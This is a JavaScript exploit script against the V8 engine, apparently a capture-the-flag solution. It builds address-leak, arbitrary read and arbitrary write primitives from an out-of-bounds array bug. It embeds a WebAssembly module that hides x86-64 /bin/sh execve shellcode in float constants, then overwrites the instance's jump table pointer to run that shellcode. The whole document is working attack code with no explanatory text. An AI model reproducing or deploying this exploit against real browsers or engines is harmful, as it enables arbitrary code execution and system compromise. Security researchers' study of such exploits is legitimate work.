let buf = new ArrayBuffer(8);
let f64_buf = new Float64Array(buf);
let u64_buf = new BigUint64Array(buf);
function ftoi(val){
        f64_buf[0]=val;
        return u64_buf[0];
}
function itof(val){
        u64_buf[0] = val;
        return f64_buf[0];
}
function tohex(val){
        return "0x" + val.toString(16);
}
function high32(x) {
        return (x >> 32n) & BigInt(0xffffffff);
}
function low32(x) {
        return x & BigInt(0xffffffff);
}
function addrof(obj){
        find_addr[0] = obj;
        return low32(ftoi(oob[4]));
}
function aar(addr){
        let index = (addr - oob_data_addr) / 8n;
        if ((addr - oob_data_addr) % 8n) 
            return high32(ftoi(oob[index])) + (low32(ftoi(oob[index+1n])) << 32n);
        else return ftoi(oob[index]);
}
function aaw(addr, val){
        let index = (addr - oob_data_addr) / 8n;
        if ((addr - oob_data_addr) % 8n) {
                oob[index] = itof(low32(ftoi(oob[index])) + (low32(val) << 32n));
                oob[index+1n] = itof(high32(val) + (high32(ftoi(oob[index+1n])) << 32n ))
        }
        else oob[index] = itof(val);
}
let oob = [1.1];
let find_addr = [{}];

let target = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 
                             0x7c, 0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01, 0x03, 0x65, 0x78, 0x70, 0x00, 0x00, 
                             0x0a, 0x53, 0x01, 0x51, 0x00, 0x44, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x07, 
                             0x44, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x5b, 0xeb, 0x07, 0x44, 0x68, 0x2f, 0x62, 0x69, 
                             0x6e, 0x59, 0xeb, 0x07, 0x44, 0x48, 0xc1, 0xe3, 0x20, 0x90, 0x90, 0xeb, 0x07, 0x44, 
                             0x48, 0x01, 0xcb, 0x53, 0x90, 0x90, 0xeb, 0x07, 0x44, 0x48, 0x89, 0xe7, 0x6a, 0x3b, 
                             0x58, 0xeb, 0x07, 0x44, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xeb, 0x07, 0x44, 0x0f, 
                             0x05, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x07, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 
                             0x0b]);

// confirmed primitive
let deleted = oob.splice(-3, 5);
print('[*] deleted.length=' + deleted.length);
print('[*] oob.length=' + oob.length);

// oob[2] = [length(hi32) | elements_ptr(lo32)]
let oob_elements_ptr = low32(ftoi(oob[2]));
let oob_data_addr = oob_elements_ptr + 8n;
print('[*] oob_elements_ptr=' + tohex(oob_elements_ptr));
print('[*] oob_data_addr=' + tohex(oob_data_addr));

let mod = new WebAssembly.Module(target);
let inst = new WebAssembly.Instance(mod);

let inst_addr = addrof(inst);
let jump_table_start = aar(inst_addr + 0x48n);
let body_start = jump_table_start + 0x800n;
let shell_entry = jump_table_start + 0x81an;

print('[*] inst_addr=' + tohex(inst_addr));
print('[*] jump_table_start=' + tohex(jump_table_start));
print('[*] body_start_guess=' + tohex(body_start));
print('[*] shell_entry_guess=' + tohex(shell_entry));

// optional sanity prints
print('[*] oob[2]=' + tohex(ftoi(oob[2])));
print('[*] oob[4]=' + tohex(ftoi(oob[4])));

aaw(inst_addr + 0x48n, shell_entry);
print('[*] patched jump_table_start => ' + tohex(shell_entry));
inst.exports.exp();
